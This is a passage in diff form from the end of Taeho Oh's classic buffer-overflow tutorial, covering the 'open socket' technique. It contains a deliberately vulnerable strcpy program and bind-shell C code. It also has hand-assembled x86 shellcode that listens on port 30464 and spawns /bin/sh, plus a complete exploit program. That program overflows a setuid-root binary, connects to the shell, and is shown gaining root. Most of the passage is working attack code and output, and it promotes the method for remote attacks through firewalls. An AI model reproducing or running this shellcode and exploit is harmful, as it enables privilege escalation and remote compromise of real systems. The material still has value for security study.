+your standard I/O. If you don't, you cannot get a shell. Even if you get a
+shell, the server crashes immediately, so you can't command anything. In this
+case, you have to make complex shellcode to connect to your standard I/O.
+
+6.1 The example vulnerable program
+
+----------------------------------------------------------------------------
+#include<string.h>
+
+int main(int argc,char **argv)
+{
+	char buffer[1024];
+	if(argc>1)
+		strcpy(buffer,argv[1]);
+}
+----------------------------------------------------------------------------
+
+ This is standard vulnerable program. I will use this for socket opening
+buffer overflow. Because I am too lazy to make a example daemon program. :)
+However, after you see the code, you will not be disappointed.
+ 
+6.2 Make open socket code
+ If you can execute below code, you can open a socket.
+
+opensocketasm1.c
+----------------------------------------------------------------------------
+#include<unistd.h>
+#include<sys/socket.h>
+#include<netinet/in.h>
+
+int soc,cli,soc_len;
+struct sockaddr_in serv_addr;
+struct sockaddr_in cli_addr;
+
+int main()
+{
+	if(fork()==0)
+	{
+		serv_addr.sin_family=AF_INET;
+		serv_addr.sin_addr.s_addr=htonl(INADDR_ANY);
+		serv_addr.sin_port=htons(30464);
+		soc=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+		bind(soc,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
+		listen(soc,1);
+		soc_len=sizeof(cli_addr);
+		cli=accept(soc,(struct sockaddr *)&cli_addr,&soc_len);
+		dup2(cli,0);
+		dup2(cli,1);
+		dup2(cli,2);
+		execl("/bin/sh","sh",0);
+	}
+}
+----------------------------------------------------------------------------
+
+ It's difficult to make with assembly language. You can make this program
+simple.
+
+opensocketasm2.c
+----------------------------------------------------------------------------
+#include<unistd.h>
+#include<sys/socket.h>
+#include<netinet/in.h>
+
+int soc,cli;
+struct sockaddr_in serv_addr;
+
+int main()
+{
+	if(fork()==0)
+	{
+		serv_addr.sin_family=2;
+		serv_addr.sin_addr.s_addr=0;
+		serv_addr.sin_port=0x77;
+		soc=socket(2,1,6);
+		bind(soc,(struct sockaddr *)&serv_addr,0x10);
+		listen(soc,1);
+		cli=accept(soc,0,0);
+		dup2(cli,0);
+		dup2(cli,1);
+		dup2(cli,2);
+		execl("/bin/sh","sh",0);
+	}
+}
+----------------------------------------------------------------------------
+
+compile and disassemble
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ gcc -o opensocketasm2 -static opensocketasm2.c
+[ ohhara@ohhara ~ ] {2} $ gdb opensocketasm2
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disassemble fork
+Dump of assembler code for function fork:
+0x804ca90 <fork>:       movl   $0x2,%eax
+0x804ca95 <fork+5>:     int    $0x80
+0x804ca97 <fork+7>:     cmpl   $0xfffff001,%eax
+0x804ca9c <fork+12>:    jae    0x804cdc0 <__syscall_error>
+0x804caa2 <fork+18>:    ret    
+0x804caa3 <fork+19>:    nop    
+0x804caa4 <fork+20>:    nop    
+0x804caa5 <fork+21>:    nop    
+0x804caa6 <fork+22>:    nop    
+0x804caa7 <fork+23>:    nop    
+0x804caa8 <fork+24>:    nop    
+0x804caa9 <fork+25>:    nop    
+0x804caaa <fork+26>:    nop    
+0x804caab <fork+27>:    nop    
+0x804caac <fork+28>:    nop    
+0x804caad <fork+29>:    nop    
+0x804caae <fork+30>:    nop    
+0x804caaf <fork+31>:    nop    
+End of assembler dump.
+(gdb) disassemble socket
+Dump of assembler code for function socket:
+0x804cda0 <socket>:     movl   %ebx,%edx
+0x804cda2 <socket+2>:   movl   $0x66,%eax
+0x804cda7 <socket+7>:   movl   $0x1,%ebx
+0x804cdac <socket+12>:  leal   0x4(%esp,1),%ecx
+0x804cdb0 <socket+16>:  int    $0x80
+0x804cdb2 <socket+18>:  movl   %edx,%ebx
+0x804cdb4 <socket+20>:  cmpl   $0xffffff83,%eax
+0x804cdb7 <socket+23>:  jae    0x804cdc0 <__syscall_error>
+0x804cdbd <socket+29>:  ret    
+0x804cdbe <socket+30>:  nop    
+0x804cdbf <socket+31>:  nop    
+End of assembler dump.
+(gdb) disassemble bind
+Dump of assembler code for function bind:
+0x804cd60 <bind>:       movl   %ebx,%edx
+0x804cd62 <bind+2>:     movl   $0x66,%eax
+0x804cd67 <bind+7>:     movl   $0x2,%ebx
+0x804cd6c <bind+12>:    leal   0x4(%esp,1),%ecx
+0x804cd70 <bind+16>:    int    $0x80
+0x804cd72 <bind+18>:    movl   %edx,%ebx
+0x804cd74 <bind+20>:    cmpl   $0xffffff83,%eax
+0x804cd77 <bind+23>:    jae    0x804cdc0 <__syscall_error>
+0x804cd7d <bind+29>:    ret    
+0x804cd7e <bind+30>:    nop    
+0x804cd7f <bind+31>:    nop    
+End of assembler dump.
+(gdb) disassemble listen
+Dump of assembler code for function listen:
+0x804cd80 <listen>:     movl   %ebx,%edx
+0x804cd82 <listen+2>:   movl   $0x66,%eax
+0x804cd87 <listen+7>:   movl   $0x4,%ebx
+0x804cd8c <listen+12>:  leal   0x4(%esp,1),%ecx
+0x804cd90 <listen+16>:  int    $0x80
+0x804cd92 <listen+18>:  movl   %edx,%ebx
+0x804cd94 <listen+20>:  cmpl   $0xffffff83,%eax
+0x804cd97 <listen+23>:  jae    0x804cdc0 <__syscall_error>
+0x804cd9d <listen+29>:  ret    
+0x804cd9e <listen+30>:  nop    
+0x804cd9f <listen+31>:  nop    
+End of assembler dump.
+(gdb) disassemble accept
+Dump of assembler code for function __accept:
+0x804cd40 <__accept>:   movl   %ebx,%edx
+0x804cd42 <__accept+2>: movl   $0x66,%eax
+0x804cd47 <__accept+7>: movl   $0x5,%ebx
+0x804cd4c <__accept+12>:        leal   0x4(%esp,1),%ecx
+0x804cd50 <__accept+16>:        int    $0x80
+0x804cd52 <__accept+18>:        movl   %edx,%ebx
+0x804cd54 <__accept+20>:        cmpl   $0xffffff83,%eax
+0x804cd57 <__accept+23>:        jae    0x804cdc0 <__syscall_error>
+0x804cd5d <__accept+29>:        ret    
+0x804cd5e <__accept+30>:        nop    
+0x804cd5f <__accept+31>:        nop    
+End of assembler dump.
+(gdb) disassemble dup2  
+Dump of assembler code for function dup2:
+0x804cbe0 <dup2>:       movl   %ebx,%edx
+0x804cbe2 <dup2+2>:     movl   0x8(%esp,1),%ecx
+0x804cbe6 <dup2+6>:     movl   0x4(%esp,1),%ebx
+0x804cbea <dup2+10>:    movl   $0x3f,%eax
+0x804cbef <dup2+15>:    int    $0x80
+0x804cbf1 <dup2+17>:    movl   %edx,%ebx
+0x804cbf3 <dup2+19>:    cmpl   $0xfffff001,%eax
+0x804cbf8 <dup2+24>:    jae    0x804cdc0 <__syscall_error>
+0x804cbfe <dup2+30>:    ret    
+0x804cbff <dup2+31>:    nop    
+End of assembler dump.
+(gdb)
+----------------------------------------------------------------------------
+
+fork(); code
+----------------------------------------------------------------------------
+char code[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+socket(2,1,6); code
+----------------------------------------------------------------------------
+	/* %ecx is a pointer of all arguments.                   */
+char code[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xf1"                      /* movl %esi,%ecx        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	/* The first argument.                                   */
+	/* %esi has reference free memory space before using     */
+	/* this instruction.                                     */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	/* The second argument.                                  */
+	"\xb0\x06"                      /* movb $0x6,%al         */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	/* The third argument.                                   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x01"                      /* movb $0x1,%bl         */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+bind(soc,(struct sockaddr *)&serv_addr,0x10); code
+----------------------------------------------------------------------------
+	/* %ecx is a pointer of all arguments.                   */
+char code[]=
+	"\x89\xf1"                      /* movl %esi,%ecx        */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	/* %eax has to have soc value before using this          */
+	/* instruction.                                          */
+	/* the first argument.                                   */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x66\x89\x46\x0c"              /* movw %ax,0xc(%esi)    */
+	/* serv_addr.sin_family=2                                */
+	/* 2 is stored at 0xc(%esi).                             */
+	"\xb0\x77"                      /* movb $0x77,%al        */
+	"\x66\x89\x46\x0e"              /* movw %ax,0xe(%esi)    */
+	/* store port number at 0xe(%esi)                        */
+	"\x8d\x46\x0c"                  /* leal 0xc(%esi),%eax   */
+	/* %eax = the address of serv_addr                       */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	/* the second argument.                                  */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x10"                  /* movl %eax,0x10(%esi)  */
+	/* serv_addr.sin_addr.s_addr=0                           */
+	/* 0 is stored at 0x10(%esi).                            */
+	"\xb0\x10"                      /* movb $0x10,%al        */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	/* the third argument.                                   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x02"                      /* movb $0x2,%bl         */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+listen(soc,1); code
+----------------------------------------------------------------------------
+	/* %ecx is a pointer of all arguments.                   */
+char code[]=
+	"\x89\xf1"                      /* movl %esi,%ecx        */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	/* %eax has to have soc value before using this          */
+	/* instruction.                                          */
+	/* the first argument.                                   */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	/* the second argument.                                  */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x04"                      /* movb $0x4,%bl         */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+accept(soc,0,0); code
+----------------------------------------------------------------------------
+	/* %ecx is a pointer of all arguments.                   */
+char code[]=
+	"\x89\xf1"                      /* movl %esi,%ecx        */
+	"\x89\xf1"                      /* movl %eax,(%esi)      */
+	/* %eax has to have soc value before using this          */
+	/* instruction.                                          */
+	/* the first argument.                                   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	/* the second argument.                                  */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	/* the third argument.                                   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x05"                      /* movb $0x5,%bl         */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+dup2(cli,0); code
+----------------------------------------------------------------------------
+	/* the first argument is %ebx and the second argument    */
+	/* is %ecx                                               */
+char code[]=
+	/* %eax has to have cli value before using this          */
+	/* instruction.                                          */
+	"\x88\xc3"                      /* movb %al,%bl          */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xcd\x80";                     /* int $0x80             */
+----------------------------------------------------------------------------
+
+6.3 Modify the normal shellcode
+
+ You need some works to merge the above codes.
+
+new shellcode
+----------------------------------------------------------------------------
+char shellcode[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x85\xc0"                      /* testl %eax,%eax       */
+	"\x75\x43"                      /* jne 0x43              */
+	/* fork()!=0 case                                        */
+	/* It will call exit(0)                                  */
+	/* To do that, it will jump twice, because exit(0) is    */
+	/* located so far.                                       */
+	"\xeb\x43"                      /* jmp 0x43              */
+	/* fork()==0 case                                        */
+	/* It will call -0xa5                                    */
+	/* To do that, it will jump twice, because call -0xa5    */
+	/* is located so far.                                    */
+	"\x5e"                          /* popl %esi             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xf1"                      /* movl %esi,%ecx        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\xb0\x06"                      /* movb $0x6,%al         */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x01"                      /* movb $0x1,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x66\x89\x46\x0c"              /* movw %ax,0xc(%esi)    */
+	"\xb0\x77"                      /* movb $0x77,%al        */
+	"\x66\x89\x46\x0e"              /* movw %ax,0xe(%esi)    */
+	"\x8d\x46\x0c"                  /* leal 0xc(%esi),%eax   */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x10"                  /* movl %eax,0x10(%esi)  */
+	"\xb0\x10"                      /* movb $0x10,%al        */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x02"                      /* movb $0x2,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xeb\x04"                      /* jmp 0x4               */
+	"\xeb\x55"                      /* jmp 0x55              */
+	"\xeb\x5b"                      /* jmp 0x5b              */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x04"                      /* movb $0x4,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x05"                      /* movb $0x5,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x88\xc3"                      /* movb %al,%bl          */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\xb1\x01"                      /* movb $0x1,%cl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\xb1\x02"                      /* movb $0x2,%cl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb8\x2f\x62\x69\x6e"          /* movl $0x6e69622f,%eax */
+	/* %eax="/bin"                                           */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb8\x2f\x73\x68\x2f"          /* movl $0x2f68732f,%eax */
+	/* %eax="/sh/"                                           */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\x5b\xff\xff\xff";         /* call -0xa5            */
+----------------------------------------------------------------------------
+
+6.4  Exploit vulnerable4 program
+ With this shellcode, you can make an exploit code easily. And You have to
+make code which connects to the socket.
+
+exploit4.c
+----------------------------------------------------------------------------
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+#include<netdb.h>
+#include<netinet/in.h>
+
+#define ALIGN                             0
+#define OFFSET                            0
+#define RET_POSITION                   1024
+#define RANGE                            20
+#define NOP                            0x90
+
+char shellcode[]=
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x85\xc0"                      /* testl %eax,%eax       */
+	"\x75\x43"                      /* jne 0x43              */
+	"\xeb\x43"                      /* jmp 0x43              */
+	"\x5e"                          /* popl %esi             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\x89\xf1"                      /* movl %esi,%ecx        */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\xb0\x06"                      /* movb $0x6,%al         */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x01"                      /* movb $0x1,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb0\x02"                      /* movb $0x2,%al         */
+	"\x66\x89\x46\x0c"              /* movw %ax,0xc(%esi)    */
+	"\xb0\x77"                      /* movb $0x77,%al        */
+	"\x66\x89\x46\x0e"              /* movw %ax,0xe(%esi)    */
+	"\x8d\x46\x0c"                  /* leal 0xc(%esi),%eax   */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x10"                  /* movl %eax,0x10(%esi)  */
+	"\xb0\x10"                      /* movb $0x10,%al        */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x02"                      /* movb $0x2,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xeb\x04"                      /* jmp 0x4               */
+	"\xeb\x55"                      /* jmp 0x55              */
+	"\xeb\x5b"                      /* jmp 0x5b              */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x04"                      /* movb $0x4,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x89\x46\x08"                  /* movl %eax,0x8(%esi)   */
+	"\xb0\x66"                      /* movb $0x66,%al        */
+	"\xb3\x05"                      /* movb $0x5,%bl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x88\xc3"                      /* movb %al,%bl          */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\x31\xc9"                      /* xorl %ecx,%ecx        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\xb1\x01"                      /* movb $0x1,%cl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb0\x3f"                      /* movb $0x3f,%al        */
+	"\xb1\x02"                      /* movb $0x2,%cl         */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xb8\x2f\x62\x69\x6e"          /* movl $0x6e69622f,%eax */
+	"\x89\x06"                      /* movl %eax,(%esi)      */
+	"\xb8\x2f\x73\x68\x2f"          /* movl $0x2f68732f,%eax */
+	"\x89\x46\x04"                  /* movl %eax,0x4(%esi)   */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\x88\x46\x07"                  /* movb %al,0x7(%esi)    */
+	"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
+	"\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
+	"\xb0\x0b"                      /* movb $0xb,%al         */
+	"\x89\xf3"                      /* movl %esi,%ebx        */
+	"\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
+	"\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
+	"\xcd\x80"                      /* int $0x80             */
+	"\x31\xc0"                      /* xorl %eax,%eax        */
+	"\xb0\x01"                      /* movb $0x1,%al         */
+	"\x31\xdb"                      /* xorl %ebx,%ebx        */
+	"\xcd\x80"                      /* int $0x80             */
+	"\xe8\x5b\xff\xff\xff";         /* call -0xa5            */
+
+unsigned long get_sp(void)
+{
+	__asm__("movl %esp,%eax");
+}
+
+long getip(char *name)
+{
+	struct hostent *hp;
+	long ip;
+	if((ip=inet_addr(name))==-1)
+	{
+		if((hp=gethostbyname(name))==NULL)
+		{
+			fprintf(stderr,"Can't resolve host.\n");
+			exit(0);
+		}
+		memcpy(&ip,(hp->h_addr),4);
+	}
+	return ip;
+}
+
+int exec_sh(int sockfd)
+{
+	char snd[4096],rcv[4096];
+	fd_set rset;
+	while(1)
+	{
+		FD_ZERO(&rset);
+		FD_SET(fileno(stdin),&rset);
+		FD_SET(sockfd,&rset);
+		select(255,&rset,NULL,NULL,NULL);
+		if(FD_ISSET(fileno(stdin),&rset))
+		{
+			memset(snd,0,sizeof(snd));
+			fgets(snd,sizeof(snd),stdin);
+			write(sockfd,snd,strlen(snd));
+		}
+		if(FD_ISSET(sockfd,&rset))
+		{
+			memset(rcv,0,sizeof(rcv));
+			if(read(sockfd,rcv,sizeof(rcv))<=0)
+				exit(0);
+			fputs(rcv,stdout);
+		}
+	}
+}
+
+int connect_sh(long ip)
+{
+	int sockfd,i;
+	struct sockaddr_in sin;
+	printf("Connect to the shell\n");
+	fflush(stdout);
+	memset(&sin,0,sizeof(sin));
+	sin.sin_family=AF_INET;
+	sin.sin_port=htons(30464);
+	sin.sin_addr.s_addr=ip;
+	if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
+	{
+		printf("Can't create socket\n");
+		exit(0);
+	}
+	if(connect(sockfd,(struct sockaddr *)&sin,sizeof(sin))<0)
+	{
+		printf("Can't connect to the shell\n");
+		exit(0);
+	}
+	return sockfd;
+}
+
+void main(int argc,char **argv)
+{
+	char buff[RET_POSITION+RANGE+ALIGN+1],*ptr;
+	long addr;
+	unsigned long sp;
+	int offset=OFFSET,bsize=RET_POSITION+RANGE+ALIGN+1;
+	int i;
+	int sockfd;
+
+	if(argc>1)
+		offset=atoi(argv[1]);
+
+	sp=get_sp();
+	addr=sp-offset;
+
+	for(i=0;i<bsize;i+=4)
+	{
+		buff[i+ALIGN]=(addr&0x000000ff);
+		buff[i+ALIGN+1]=(addr&0x0000ff00)>>8;
+		buff[i+ALIGN+2]=(addr&0x00ff0000)>>16;
+		buff[i+ALIGN+3]=(addr&0xff000000)>>24;
+	}
+
+	for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
+		buff[i]=NOP;
+
+	ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;
+	for(i=0;i<strlen(shellcode);i++)
+		*(ptr++)=shellcode[i];
+
+	buff[bsize-1]='\0';
+
+	printf("Jump to 0x%08x\n",addr);
+
+	if(fork()==0)
+	{
+		execl("./vulnerable4","vulnerable4",buff,0);
+		exit(0);
+	}
+	sleep(5);
+	sockfd=connect_sh(getip("127.0.0.1"));
+	exec_sh(sockfd);
+}
+----------------------------------------------------------------------------
+
+exploit the vulnerable4 program
+----------------------------------------------------------------------------
+[ ohhara@ohhara ~ ] {1} $ ls -l vulnerable4
+-rwsr-xr-x   1 root     root         4091 Oct 18 20:21 vulnerable4*
+[ ohhara@ohhara ~ ] {2} $ ls -l exploit4
+-rwxr-xr-x   1 ohhara   cse          7973 Oct 18 20:25 exploit4*
+[ ohhara@ohhara ~ ] {3} $ ./exploit4
+Jump to 0xbfffec64
+Connect to the shell
+Can't connect to the shell
+[ ohhara@ohhara ~ ] {4} $ ./exploit4 500
+Jump to 0xbfffea70
+Connect to the shell
+whoami
+root
+----------------------------------------------------------------------------
+
+6.5 What can you do with this technique?
+ You can make various remote exploit code with this technique. If the
+vulnerable host is behind the firewall, you can open a socket in unfiltered
+port. This is a very useful technique when you attack rpc service with buffer
+overflow.
+
+7. Summary
+ This paper introduced four buffer overflow techniques. They are pass through
+filtering, change uid back to 0, break chroot, and open socket. These
+techniques will be very useful when you try to make a buffer overflow exploit
+code. In addition, these techniques can be combined.
+ All programers MUST be careful when making a setuid root program or server
+program!!! PLEASE BE CAREFUL!!!!!
+
+8. References
+ Smashing The Stack For Fun And Profit by Aleph1
+ wu-ftpd remote exploit code by duke
+ ADMmountd remote exploit code by ADM
+
+9. Etc
+ Sorry for my poor English. :(
+
+ Written by Taeho Oh ( ohhara@postech.edu )
+----------------------------------------------------------------------------
+Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
+PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
+PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug
+----------------------------------------------------------------------------
+
+
+                 ------------------------------------------
+                 Special thanks to all of PLUS members. ^_^
+                 ------------------------------------------
+
+
+
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+
+
+
+-- 
+
+Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
+PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
+PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug
+
